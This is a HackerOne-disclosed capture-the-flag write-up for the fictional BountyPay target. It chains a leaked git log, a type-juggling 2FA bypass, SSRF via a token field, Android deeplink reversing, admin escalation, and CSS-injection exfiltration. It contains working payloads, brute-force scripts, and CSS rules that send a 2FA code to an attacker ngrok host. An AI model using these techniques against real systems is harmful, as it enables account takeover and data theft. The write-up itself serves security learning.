# [H1-2006 2020] In-depth resolution of the h1-2006 CTF

## Report Details
- **Report ID**: 894174
- **URL**: https://hackerone.com/reports/894174
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-09T00:58:18.780Z
- **Disclosed**: 2020-06-18T16:10:49.084Z

## Reporter
- **Username**: enzyro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# H1-2006 Write-up bountypay.h1ctf.com

First of all, huge thanks to the creators for this CTF, it was really fun and got me to improve a lot !
It was my first h1 ctf, and it for sure won't be my last ! 

For this report, I'll try to define for each step :
* an abstract of what was the bug
* the real life impact it would have had
* a potential fix
* an in-depth explanation of what I was thinking, what I tried, and what worked

Thank you to any reviewer for his/her time on this.

The final flag is :
`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

# Step 1 - It all starts with recon

## Abstract
Able to access to a git repository that leads an attacker to a log file that is served on the web server containing credentials.

## Impact
Login as an authorized user on `app.bountypay.h1ctf.com`.

## Potential fix
Make the .git folder unaccessible on the server & make sure log files are not accessible as well.

## In-depth explanation
We are given a wildcard domain `*.bountypay.h1ctf.com`, so let's get to it !
I started by using subfinder and https://crt.sh, this is usually enough to get most domains.
The domains I found are as follows :

```
api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
```
I found it interesting to have a ctf on a wildcard domain, as I wasn't really sure those five domains were all there was, so I kept in my notes to check for other domains if I get really stuck.

I started my nmap scan on those subdomains, using the `-sCV` argument to run the defaults scripts & version detection.
While my scan was running, I did a quick check on the [wayback machine](https://archive.org/web/) to make sure those domains were never snapshoted as it might have revealed some clues.

I got a hit for port 80, 443 and 22 on every domain, like I expected, so I started running gobuster with my go-to [wordlist](https://github.com/v0re/dirb/blob/master/wordlists/common.txt) on every domain.
I first tried to use the `redirect` endpoint on the `api.bountypay.h1ctf.com` to try and get an SSRF, without any success, so I thought that would be useful later.

The nmap script scan showed a potential git repository on the `app.bountypay.h1ctf.com` subdomain :
```
| http-git:
|   3.21.98.146:443/.git/
|     Potential Git repository found (found 3/6 expected files)
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/bounty-pay-code/request-logger.git
```
That was later confirmed by a hit on `/.git/HEAD` by gobuster.

I started reading the code on the [remote github repository](https://github.com/bounty-pay-code/request-logger.git), and quickly found about the `bp_web_trace.log` file that was logging incoming requests.
To make sure I wasn't missing anything, I used the great [gitTools](https://github.com/internetwache/GitTools) dumper script to dump all the .git repository. There was nothing more that was interesting in it.

# Step 2 - Knocking on login's door

## Abstract
When an attacker tries to login with a working password & username, he can bypass the 2FA due to a weak typed comparison/type juggling attack

## Impact
Access to a user's account without having to validate the 2FA

## Potential fix
Make sure every user input is strongly typed specially when using a language that doesn't force you to strongly type your variables (python, php, javascript ...).

## In-depth explanation
In the `bp_web_trace.log` file, I found some b64 encoded strings containing access logs to the website :
```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

I instantly tried the credentials contained in the 2nd line on the login page `username=brian.oliver&password=V7h0inzX` aaaaand we're IN ...

{F859887} 

... But there is a 2FA to bypass.

I first tried to use the same `challenge_answer=bD83Jk27dQ` from the 3rd line of the log file, without success. After that I quickly found that the challenge was send along with the challenge_answer like this

{F859891} 

So the challenge is a md5 and the answer a short alphanumeric string.

I instantly thought about magic hashes (or type juggling)
got the first one from this [file](https://github.com/spaze/hashes/blob/master/md5.md) and tried it aaaaand it worked ! (I was really proud to think about it this fast and to get it on the first try !).

So here's the payload that allowed me to bypass the 2FA :
`username=brian.oliver&password=V7h0inzX&challenge=0e462097431906509019562988736854&challenge_answer=240610708`

And we're now logged in !

# Step 3 - To ken or not token

## Abstract
The authentication token is used in the application flow resulting in a LFI and a SSRF because this input is not sanitized.

## Impact
Access to IP restricted areas due to an unsanitized user input.

## Potential fix
Every user accessible input needs to be sanitized before being used in an application, even if it isn't something a typical user would try to change.

## In-depth explanation
When logged in, we get a token :
`eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` which once decoded from base64 gives us `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`.

When we look back at the decoded logs, we see that the user was requesting the `/statements` endpoint, and when we try to request it we get :

{F859886} 

In the response we see the url being requested by the app on the api :
`https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020`

We now know that the account requested is the value we have inside the token, so let's try to play with it a bit :
The first problem was that I needed to ignore the last part of the request : `/statements?month=01&year=2020` because even if we had a properly working SSRF or LFI, the *statements* part would be a problem.
After trying some things that didn't work, I thought about the HTML anchors that are defined by a #.
so I tried adding `/#` to my account_id and sending it :
`{"account_id":"F8gHiqSdpK/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`

and got a response that contained some more information : 

{F859885} 

By then, I was pretty sure I had to play with that account id to get either a LFI or a SSRF. At that time I thought about the `redirect` endpoint I had seen earlier during my initial recon, and started to try accessing the `software.bountypay.h1ctf.com` domain that wasn't accessible due to an IP check.

after some tries, I managed to access to the software domain using this payload :

`{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`

{F859884}

And so there was another login page in there.
since we could not send post data using this SSRF, I was pretty sure we didn't have to login, but to scan the website from here to get more juicy data.

I wrote a quick & dirty python script to do that for me using the same wordlist as earlier.

My script quickly found that `/uploads` was available, so I requested it :

{F859883} 

And there we get the information that there is an Apk file available in the directory !!

`https://software.bountypay.h1ctf.com/uploads/BountyPay.apk`

Requested it through a web browser, and let's get to the next step !

# Step 4 - It's Android time

## Abstract
There isn't any real "bug" on this step (except for the insecure logging on the 3rd part), mostly just understanding how to reverse engineer an android application.

## In-depth explanation
So we get our apk, fortunately, I'm used to testing android apps in bug bounties programs, so this shouldn't be too hard.
As always when testing an apk I would decompile the java code back into files using [jadx](https://github.com/skylot/jadx), and launch the apk on a rooted emulator, running with a burp certificate at system level to allow me to inspect web requests.

while looking at the `AndroidManifest.xml` it appears we have to complete 3 steps, defined by 3 activities :
* PartOneActivity.java
* PartTwoActivity.java
* PartThreeActivity.java

And also that there is one way to launch every activity using a custom deeplink for each :

{F859881} 

So the parts should be started by a deeplink starting by :
* one://part
* two://part
* three://part

## Part 1

First let's take a look at the activity :

{F859880} 

Not much to see here.

Looking at the decompiled code of the PartOne OnCreate : 
```java
if (getIntent() != null && getIntent().getData() != null) {
            String firstParam = getIntent().getData().getQueryParameter("start");
            if (firstParam != null && firstParam.equals("PartTwoActivity") && settings.contains(user))
```

We see that this activity should be launched with a queryparameter `start` that should be equal to `PartTwoActivity` so let's try this using adb :
`adb shell am start -n bounty.pay/.PartOneActivity -d one://part?start=PartTwoActivity`

{F859877} 

And we're straight to the Part2 !

## Part 2

So, nothing much either on the screen on the activity, so let's take a look at the decompiled onCreate :

```java
if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    String firstParam = data.getQueryParameter("two");
    String secondParam = data.getQueryParameter("switch");
    if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textview.setVisibility(0);
    }
```

So this is very much like the first activity, but this time we have to set to parameters :
* two=light
* switch=on
in order to make some buttons visible.

let's use adb again to start it :
`adb shell am start -n bounty.pay/.PartTwoActivity -d "two://part?two=light\&switch=on"`

Note that you should really not forget the `\` before the `&` to avoid it being interpreted by bash.

now we get some things printed on the screen :

{F859877}

so we have a md5 string `459a6f79ad9b13cbcb5f692d2cc7a94d` and a submit, the first thing I tried is to check if the md5 is in the [crackstation](https://crackstation.net/) database.

{F859876} 

so the md5 value is `Token`, I tried inputting it into the field, but it didn't work, so I went back to the code and saw :

```java
StringBuilder stringBuilder = new StringBuilder();
stringBuilder.append("X-");
stringBuilder.append(value);
```
Oh, so that value should be `X-Token` !
And we're through this part2 !

## Part 3

Same as the first two activities, we don't have much on the screen :

{F859877} 

```java
if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    String firstParam = data.getQueryParameter("three");
    String secondParam = data.getQueryParameter("switch");
    String thirdParam = data.getQueryParameter("header");
    byte[] decodeFirstParam = Base64.decode(firstParam, 0);
    byte[] decodeSecondParam = Base64.decode(secondParam, 0);
    final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);
    final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);
    AnonymousClass5 anonymousClass5 = r0;
    DatabaseReference databaseReference = this.childRefThree;
    final String str = firstParam; //b64(get(three))
    final String str2 = secondParam; //b64(get(switch))
    secondParam = thirdParam; //get(header)
    final EditText editText2 = editText;
    final Button button2 = button;
    AnonymousClass5 anonymousClass52 = new ValueEventListener() {
        public void onDataChange(DataSnapshot dataSnapshot) {
            String value = (String) dataSnapshot.getValue();
            if (str != null && decodedFirstParam.equals("PartThreeActivity") && str2 != null && decodedSecondParam.equals("on")) {
                String str = secondParam; //get(header)
                if (str != null) {
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append("X-");
                    stringBuilder.append(value);
                    if (str.equals(stringBuilder.toString())) {
                        editText2.setVisibility(0);
                        button2.setVisibility(0);
                        PartThreeActivity.this.thread.start();
                    }
                }
            }
        }
```

After breaking down what does this part mean, we have to send a deeplink again with :
* three=b64(PartThreeActivity)
* switch=b64(on)
* header=X-Token

I had the right idea in the beginning but the b64 I was using included a newline so it took me a few hours to figure out what I was doing wrong, here is the final adb payload :
`adb shell am start -n bounty.pay/.PartThreeActivity -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"`

And we now get our button that talks about a "leaked hash" :

{F859874} 

Where could we get that leaked hash ?

```java
public String performPostCall(String paramValue) {
    SharedPreferences settings = getSharedPreferences(KEY_USERNAME, 0);
    String token = "";
    String host = settings.getString("HOST", token);
    token = settings.getString("TOKEN", token);
    Log.d("HOST IS: ", host);
    Log.d("TOKEN IS: ", token);
    ...
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("X-Token: ");
    stringBuilder.append(paramValue);
    Log.d("HEADER VALUE AND HASH ", stringBuilder.toString());

```
We could see that leaked hash in 3 different places :
* In the settings file, that is located on the android in `/data/data/bounty.pay/shared_prefs/user_created.xml` (the device needs to be rooted in order to access this file).
* We can also see it in logcat by using `adb logcat TOKEN:V` while sending the previous `am start` command.
* We can see it in Burp proxy if the emulator has the Burp certificate installed, because it is send in a request.

So this famous `leaked hash` is equal to `8e9998ee3137ca9ade8f372739f062c1`.

After inputting this hash in the text field, we get this screen :

{F859872} 

Woohoo, we're through !

and according to the `CongratsActivity` code :
```java
Snackbar.make(view, (CharSequence) "Information leaked here will help with other challenges.", 0).setAction((CharSequence) "Action", null).show();
```
This information will help us later !

# Step 5 - Good to know, but what the **** am I supposed to do with it ?

## Abstract
Using a previously leaked token and some OSINT, an attacker is able to login into a restricted area.

## Impact
Unauthorized access to restricted area

## Potential fix
Making sure you don't leak any token, and properly training employees about what they post on social media and how it could result in an attack. 

## In-depth explanation
This part was probably my biggest time loss in comparison to what I was supposed to do.

From what I've gathered from the apk, I know I need to use a `X-Token: 8e9998ee3137ca9ade8f372739f062c1` on the api.
after trying to use it on every endpoint I knew, I began thinking that was not the good place. So I started to request every domain, and every endpoint previously found with that same header.

After seeing all of this didn't work, I went back to the apk to check what was the part that was doing a request to see if I missed something :

```java
public String performPostCall(String paramValue) {
        SharedPreferences settings = getSharedPreferences(KEY_USERNAME, 0);
        String token = "";
        String host = settings.getString("HOST", token);
        token = settings.getString("TOKEN", token);
        Log.d("HOST IS: ", host);
        Log.d("TOKEN IS: ", token);
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(host).openConnection();
            conn.setReadTimeout(10000);
            conn.setConnectTimeout(15000);
            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            Builder builder = new Builder().appendQueryParameter("firstParam", paramValue);
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("X-Token: ");
            stringBuilder.append(paramValue);
            Log.d("HEADER VALUE AND HASH ", stringBuilder.toString());
            String query = builder.build().getEncodedQuery();
            if (query != null) {
                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                writer.write(query);
                writer.flush();
                writer.close();
                os.close();
                conn.connect();
            }
        } catch (IOException e) {
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append("Post request did not send: ");
            stringBuilder2.append(e);
            Log.e("tag", stringBuilder2.toString());
        }
        return "hi";
    }
```
Sooo that request is using the right header, and it's directed at `api.bountypay.h1ctf.com`, so I thought I might use burp to see the response, so I did set up again my certificate on my emulator aaaaand :

{F859871} 

Nothing ...

I thought I wasn't hitting the right endpoint, so I went for a [frida](https://frida.re/) installation in order to get the URL used by the request at runtime.
I used the [log_string.js](https://github.com/iddoeldor/frida-snippets/blob/master/scripts/log_string_builders_and_string_compare.js) script to be able to see the strings used by the app directly at runtime, and I saw that I wasn't wrong during my static analysis thinking the url was really `api.bountypay.h1ctf.com`.

Let's get back to square 1, what did I miss ?

I went straight back to my gobuster to find an endpoint on the api I could have missed.

After not seeing anything different from the first results on the direct domain, I started to review every path I found previously on the app, specially the endpoint used for the account information previously `https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020` and I started to bruteforce using `/api/accounts` and `/api`.

Finally I got a hit ! `/api/staff` was found. That might be just what I'm looking for.
Went back to burp to send the request with the `X-Token` header set aaaaaaand :

{F859870} 

I was really disappointed, but I kept looking for another place.
After hours of searching on every other domain and on api, I went back to the `/api/staff` endpoint, and IT FINALLY WORKED !
When I issued the first request (screenshot above), there was a space between the `X-Token` and the `:`...
So I finally got what I'm looking for !
`[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]`
(I'm guessing the backend expects the exact string `X-Token: 8e9998ee3137ca9ade8f372739f062c1` and is not trimming for whitespaces the incoming string like backends would usually do)

Now I'm in possession of 2 staff_id, thats when I remembered there was a hint on Hackerone's twitter, linking to Bountypay's twitter, that was following a *Sandra Allison* with a badge picture.

{F859873} 

I now had 3 different names and staff_id :
* Sam Jenkins | STF:84DJKEIP38
* Brian Oliver | STF:KE624RQ2T9
* Sandra Allison | STF:8FJ3KFISL3

I instantly tried a POST request on the same endpoint, and got the response :
`400 ... ["Missing Parameter"]`

So I thought I needed to set either the name, the staff_id, or both. After trying for quite some time to try every different combination of those, either in json, or as a parameter string, I felt really disappointed again not to manage to get to the next step while I thought I had the right way of thinking.
After having tried every possible combination, I thought that this might be a Content-type issue, and started trying every combination and by specifying the content-type to either `application/json` with a json payload or `application/x-www-form-urlencoded` with a param string
This was the request that worked, with Sam Jenkins' staff_id :

{F859868} 

After trying every staff_id I had and finally got the answer I wanted :

`{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}`

Woohooo we're through this easy but painful part, that was mostly me making stupid mistakes and banging my heads on the wall.

# Step 6 - Luke, I am your admin ! 

## Abstract
Due to some poor choices in the application design, an attacker with a user access is able to escalate to admin only by using the application design.

## Impact
Privilege escalation from unprivileged user to admin

## Potential fix
Making sure every user input is properly sanitized would prevent this attack, but security by design recommends that the privileges management should not be handled on the client side of the application.  

## In-depth explanation
Let's use the username & password we just got to log in on `staff.bountypay.h1ctf.com`.

{F859869} 

The `home` template has 4 different tabs :

* Home
* Support tickets
* Profile
* Logout

Through navigating on the pages, I quickly found a js file that contained interestings functions.
it was named `website.js` and the code looks like :
```javascript
$(".upgradeToAdmin").click(function() {
    let t = $(input[name=username]).val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
})


$(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
})

$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
})

document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

I figured that what we wanted to do was to upgrade to admin, so I tried hitting the endpoint directly and got greeted by a 401 response :

{F859866} 

Okay, we need to find a way to make the admin request this for us then.

By looking at the other functions, there was a few more interesting stuff :
* Send a report about a page so an admin could check, even though it was specified that `Pages in the /admin directory will be ignored for security`
* The HTML anchors if containing tab1 to tab4 would trigger automatic click.

With that, I started to think that I had to make the admin click on something that would trigger me getting upgraded.

Let's get to it !

First, I wanted to try and make myself trigger a function by using an anchor, so I searched for where I could get some input, and the answer was on tab3 where you could change your avatar & your username, and the app would send you a new cookie containing your preferences.

{F859867} 

tampering with the username was not really interesting, but I noticed that changing the avatar was reflected in the avatar's class on the tickets page. What if I could change my avatar value to something like `tab3 sendReport` ? By requesting the tickets page with a `#tab3`, it would probably trigger a click on the tab3, resulting on a click on sendReport as well ?
Time to put the theory to a test :

I first requested to change my avatar to `tab3 sendReport`, and got this cookie :
`c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrU2dnMzNuUWdXNk1ES1pXSDBXdTU4QlZPMS80UEh1WUJZdFoyVTlGa0IvbFdqUThBYjF6MFU0Q3cxcW9RbkdRVnE2OFd3UjZvQUFScFMveS92VURmZlFqdjZ1U1pSU3JlcHVQYXEzRUFFeFgwOGorMTcxcA%3D%3D`
Now, let's use this cookie and request :
`https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab3`

and we get the alert !!!

{F859864} 

So cool ! Let's try with the upgradeToAdmin function ! But nothing happened ...

I went through the code one more time and figured that I needed to set the username for the function to work. Oh, it's getting kind of tricky... After searching for a few hours I figured it out, I need to use the login's page username !
but for that, I need to be able to send multiple template values in the url. Maybe an array could do the trick ?

`https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab3`

And nothing again...

I went back to square one, and re-read the code, re-tried everything... I couldn't understand, it should be working. 
After a good night of sleep, I went back to it and it was obvious, so obvious... I need to get the admin to click on my function ! not me !

sooo we need to send a report with that url as b64 and it should be working !

{F859865} 

And we get another cookie ! We're through !

Let's request the home again with that cookie and BOOM we are admin now. And we get access to a new tab containing creds :

{F859863} 

The user marten.mickos seems promising ! let's login with him on the app now.

We get the same 2FA we have had on step2, let's bypass it the same way using magic hashes.

We're on home as marten.mickos now. If we still remember how the challenge started, the goal was to deliver the May payments to hackers, so there will probably be a transaction if we request the statements for `05/2020`, and there is :

`"Transactions for 2020-05\",\"transactions\":[{\"id\":17538771,\"hash\":\"27cd1393c170e1e97f9507a5351ea1ba\",\"hackers\":272,\"programs\":84,\"reports\":270,\"amount\":\"$210,300\"}]}"}`

So now we need to get the payments done right ? in the `app.js` there is this code :
```javascript
$(".loadTxns").click(function() {
    let t = $('select[name="month"]').val(),
        e = $('select[name="year"]').val();
    $(".txn-panel").html(""), $.get("/statements?month=" + t + "&year=" + e, function(t) {
        if (t.hasOwnProperty("data")) {
            let e = JSON.parse(t.data);
            if (e.hasOwnProperty("transactions"))
                if (0 == e.transactions.length) $(".txn-panel").html('<div class="text-center" style="margin:10px">No Transactions To Process</div>');
                else {
                    let t = "";
                    t += '<table style="margin:0" class="table"><tr><th>Hacker(s)</th><th class="text-center">Program(s)</th><th class="text-center">Reports(s)</th><th class="text-center">Pay Out</th><th class="text-center">Action</th></tr>', $.each(e.transactions, function(e, s) {
                        t += "<tr><td>" + s.hackers + '</td><td class="text-center">' + s.programs + '</td><td class="text-center">' + s.reports + '</td><td class="text-center">' + s.amount + '</td><td class="text-center"><a href="/pay/' + s.id + "/" + s.hash + '" class="btn btn-sm btn-success">Pay</a></td></tr>'
                    }), t += "</table>", $(".txn-panel").html(t)
                }
            else alert("Invalid Response From The Server")
        } else alert("Invalid Response From The Server")
    })
});
```

So we need to call the `/pay/<id>/<hash>` endpoint to get our payments done !

{F859862} 

Oh no, still one more step to go... this 2FA looks like it won't be bypassed by a simple magic hash. Okay let's do it then !

# Final Step - CSS is harmless, unless ...?

## Abstract
The webpage is loading a CSS page from an non-sanitized source, resulting in a CSS injection that allows an attacker to retrieve enough parts of the 2FA code to be able to access a very sensitive function.

## Impact
Ability to use access a restricted area & sensitive function from an unauthorized attacker.

## Potential fix
Making sure every code loaded by the website is allowed, even if it's only CSS that isn't usually a danger.  

## In-depth explanation
At first I thought, maybe this was again a magic hash but that the application was verifying that the challenge & the time limit sent.
Just to make sure, I checked the same resolution method as the first 2FA (spoiler alert : it didn't work), and I wrote a quick & dirty python script (right below this paragraph) that requests the challenge multiple times until a `challenge` starts with Oe, meaning if this was a weak comparison again, I could just send a value contained in the magic hashes list to get an access. As I suspected that didn't work either.
```python
import requests
from bs4 import BeautifulSoup


url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'

post = {'app_style': 'https%3A%2F%2F4291e5a07787.ngrok.io%2Fselector.css'}
challenge = ''
while not challenge.startswith('0e'):
    x = requests.post(url_challenge, data = post, cookies = {"token": "eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"})
    soup = BeautifulSoup(x.text, 'html.parser')
    challs = soup.find_all("input")[0:2]
    for val in challs:
        print(val['value'])
        challenge=val['value']
```

I was left with the app_style field that was sent in the POST request and that contained a CSS file url :
`app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css`

I remembered reading about CSS injection in a [blog post](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) from D0nut, but never exploited it before.
I read again the blog post, and figured the challenge answer I was looking for was probably pretty much like a csrf token, as an `input` div with `type=hidden`.

After hosting a CSS file containing basic payloads from the blog post, I was able to get a callback on a url, then I started thinking about how to get the name of the field I was searching for :

To try and get an idea on the name of the field, I used this css file :

```css
[id="code"i] {background:url("http://code.f4d745fe3bcf.ngrok.io");}
[id="otp"i] {background:url("http://otp.f4d745fe3bcf.ngrok.io");}
[id="2fa"i] {background:url("http://2fa.f4d745fe3bcf.ngrok.io");}
[id="challenge"i] {background:url("http://challenge.f4d745fe3bcf.ngrok.io");}
[id="challenge_answer"i] {background:url("http://challenge_answer.f4d745fe3bcf.ngrok.io");}
[id="token"i] {background:url("http://token.f4d745fe3bcf.ngrok.io");}
[id="totp"i] {background:url("http://totp.f4d745fe3bcf.ngrok.io");}
[name="code"i] {background:url("http://code.f4d745fe3bcf.ngrok.io");}
[name="otp"i] {background:url("http://otp.f4d745fe3bcf.ngrok.io");}
[name="2fa"i] {background:url("http://2fa.f4d745fe3bcf.ngrok.io");}
[name="challenge"i] {background:url("http://challenge.f4d745fe3bcf.ngrok.io");}
[name="challenge_answer"i] {background:url("http://challenge_answer.f4d745fe3bcf.ngrok.io");}
[name="token"i] {background:url("http://token.f4d745fe3bcf.ngrok.io");}
[name="totp"i] {background:url("http://totp.f4d745fe3bcf.ngrok.io");}
```

but I didn't get any callback on my listener, so I thought that the name was gonna be a bit more difficult to find.

I wrote yet another python script to help me get the name of the field I was searching for :

```python
import requests
from bs4 import BeautifulSoup

alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'
url_local = 'https://4291e5a07787.ngrok.io'
for c in alphabet:
    css_payload = 'input[name^=""] ~ * { background-image: url("https://4291e5a07787.ngrok.io/1/'+ c +'"); }'
    f = open("selector.css", "w")
    f.write(css_payload)
    f.close()
    post = {'app_style': 'https://4291e5a07787.ngrok.io/selector.css'}
    x = requests.post(url_challenge, data = post, cookies = {"token": "eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"})
    print("testing : " + css_payload)
```

I made sure I was using the `~ *` css selector, and the `^=` to try character by character, like explained in the blog post to make sure I would get the right field even if there was a `type=hidden`.

I got to find that the name began by `code_`, and then something wieird happened, I got 6 characters, 1 to 6.

After verifying my results a few times, I came to the only possible conclusion, there must have been the fields `code_1` to `code_6` !

After that, I started using the same technique to get the value, but I found out quickly that the values were changing everytime, hence the 2 minutes timestamp.
so I figured I needed to create a css file containing every line I needed to get the value :
```python
import requests
from bs4 import BeautifulSoup

alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-+'
url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'
url_local = 'https://4291e5a07787.ngrok.io'
for i in range(1,6):
    for c in alphabet:
        css_payload = 'input[name="code_' + i + '"][value^="' + c + '"] ~ * { background-image: url("https://4291e5a07787.ngrok.io/' + i + '/'+ c +'"); }' 
        f = open("selector.css", "a")
        f.write(css_payload + "\n")
        f.close()
```
you can see the final css file used attached as `selector.css`
since the input length on the HTML page was specifying that the input was 7 characters :
`<input name="challenge_answer" class="form-control" maxlength="7">`

It felt pretty obvious that I needed to bruteforce the 7 character, so I did setup a burp intruder to be able to quickly bruteforce the last character.
but then, for some obscure reason, I would get a random number of callbacks every time I would make the post request with my custom css.

I figured this might have been intended in order to force players to create a small api to automate the POST request and bruteforce when the request gets all 6 parts of the code.
Since I felt pretty lazy, I figured I would try to get it by manually launching my request and looking at the results log, and it took me under 15 minutes to get all 6 characters !
When I did get the 6 characters, I instantly sent the request to the burp intruder to bruteforce the last one aaaaaand :

{F859889} 

The final flag is :
`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

In a little bit less than 4 days working on this ctf, I finally worked my way through it. It was really interesting, and the 2 last parts were really challenging, especially for me since I'm not really good with clientside bugs. As well, I'm used to CTF and it was nice having all the steps to complete one by one rather than a classic jeopardy style where challenges aren't connected one to another.

If you made it this far in the reading, I think you're a bit crazy, but I still thank you very much for it, and I hope you liked the ride.
Finally, I would like to say that I'm sorry for any wrong sentence or any misspelling, because english is not my main language.


Enzyro

## Impact

The attacker managed to get the payments done !

## Attachments
- last_challenge.png
- staff_admin.png
- staff_sendreport.png
- staff_cookie.png
- staff_upgrade.png
- staff_avatar.png
- post_success.png
- staff_login.png
- post_staff1.png
- post_apk.png
- apk_congrats.png
- barcode.jpeg
- apk_part3_screen2.png
- apk_part3_screen.png
- apk_part2_crackstation.png
- apk_part2_screen2.png
- apk_part2_code.png
- apk_part2_screen.png
- apk_part1_screen.png
- apk_manifest_deeplinks.png
- apk_part1_code.png
- token_software_uploads.png
- token_software_login.png
- token_sharp.png
- statements_request.png
- first_2fa.png
- selector.css
- FLAG.png
- barcode.jpeg
- 2fa_burp.png
